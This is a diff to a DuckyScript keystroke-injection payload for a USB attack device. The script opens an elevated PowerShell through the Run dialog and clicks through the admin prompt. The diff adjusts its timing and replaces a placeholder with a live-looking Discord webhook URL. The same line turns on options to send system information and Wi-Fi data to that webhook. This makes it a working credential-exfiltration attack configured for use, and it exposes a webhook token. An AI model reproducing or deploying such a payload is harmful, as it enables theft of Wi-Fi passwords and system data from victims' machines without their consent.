@@ -2,15 +2,15 @@ DELAY 100
 WINDOWS r
 DELAY 150
 STRING powershell Start-Process powershell -Verb runAs
-DELAY 50
-ENTER
-DELAY 400
-LEFTARROW
 DELAY 200
 ENTER
 DELAY 700
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 800
 REM **CUSTOMIZATION** Use these variables to pick what the program does
-STRING $webhook = "PUT WEBHOOK HERE"; $useSpoilers = "true"; $sendSysInfo = "true"; $sendWifiData = "true"
+STRING $webhook = "https://discord.com/api/webhooks/1267380933858820107/GS4PzsVnt10KCQBLjLRFwkLGlgUzYfm05e_J1KMt5sJaqKa7yqWoE4h32MM1kN6tEPz2"; $useSpoilers = "true"; $sendSysInfo = "true"; $sendWifiData = "true"
 DELAY 50
 ENTER
 DELAY 50
